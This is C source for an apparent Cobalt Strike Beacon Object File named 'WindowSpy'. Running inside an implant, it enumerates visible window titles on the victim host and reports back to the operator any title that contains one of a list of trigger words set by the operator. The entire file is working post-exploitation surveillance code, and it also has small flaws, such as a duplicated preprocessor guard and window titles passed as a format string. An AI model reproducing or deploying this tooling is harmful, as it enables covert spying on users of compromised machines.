#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include "bofdefs.h"
#include <ctype.h>

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
    BeaconPrintf(CALLBACK_ERROR, "(%s at %d): %s 0x%08lx", func, line, msg, hr);
#else
    printf("[-] (%s at %d): %s 0x%08lx", func, line, msg, hr);
#endif // BOF

    return FALSE;
}
#pragma endregion

char match[] = "__TW_@L3R7__\n";
char triggerWordsKey[] = "TriggerWords";

int alert = 2;

int tolower(int c) {
    if (c >= 'A' && c <= 'Z') {
        c += 32;
    }
    return c;
}

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (IsWindowVisible(hwnd)) {
        char wnd_title[256];
        GetWindowTextA(hwnd, (LPSTR)&wnd_title, sizeof(wnd_title));
        for (int i = 0; wnd_title[i]; i++) {
            wnd_title[i] = tolower(wnd_title[i]);
        }
        if (strlen(wnd_title) > 1) {
            // Retrieve the trigger words from the Beacon value
            char* triggerWords = (char*)BeaconGetValue(triggerWordsKey);
            if (triggerWords != NULL) {
                char triggerWordsCopy[1000];
                strcpy_s(triggerWordsCopy,1000, triggerWords);

                char* word = strtok(triggerWordsCopy, ",");
                while (word != NULL) {
                    char* ismatch = strstr(wnd_title, word);
                    if (ismatch != NULL) {
                        BeaconPrintf(0x0, wnd_title);
                        alert = 1;
                        break;
                    }
                    word = strtok(NULL, ",");
                }
            }
        }
    }
    return true;
}


#ifdef BOF
#ifdef BOF
void go(char* buff, int len) {
    //BeaconPrintf(0x0, "[DEBUG] BOF Start");
    datap parser;
    char* arg;
    char* triggerWords = 0;
    BeaconDataParse(&parser, buff, len);
    arg = BeaconDataExtract(&parser, NULL);

    if (BeaconGetValue(triggerWordsKey) != NULL) {
        triggerWords = (char*)BeaconGetValue(triggerWordsKey);
        //BeaconPrintf(0x0, "[DEBUG] trigger words are: %s", triggerWords);
    }
    else {
        triggerWords = (char*)malloc(1000);
        BeaconAddValue(triggerWordsKey, triggerWords); //if the beacon key doesn't exist already, we create it
        //BeaconPrintf(0x0, "[DEBUG] BOF initialized triggerWords key at 0x%p", &triggerWords);
    }
    if (arg != NULL) {
        // If an argument exists, add or update the trigger words
        //BeaconPrintf(0x0, "[DEBUG] BOF Args parsed");
        strcpy_s(triggerWords, 1000, arg); // Copy the entire arg string using strcpy_s
        BeaconPrintf(0x0, "[+] Updated WindowSpy trigger words to %s", triggerWords);
    }
    if (strlen(triggerWords) > 2) {
        //BeaconPrintf(0x0, "[+] checking");
        EnumWindows(EnumWindowsProc, 0);
    }

    if (alert == 1) {
        BeaconPrintf(0x0, match);
    }
}
#else
void main(int argc, char* argv[]) {
    EnumWindows(EnumWindowsProc, 0);
}
#endif

#else
void main(int argc, char* argv[]) {
    EnumWindows(EnumWindowsProc, 0);
}
#endif
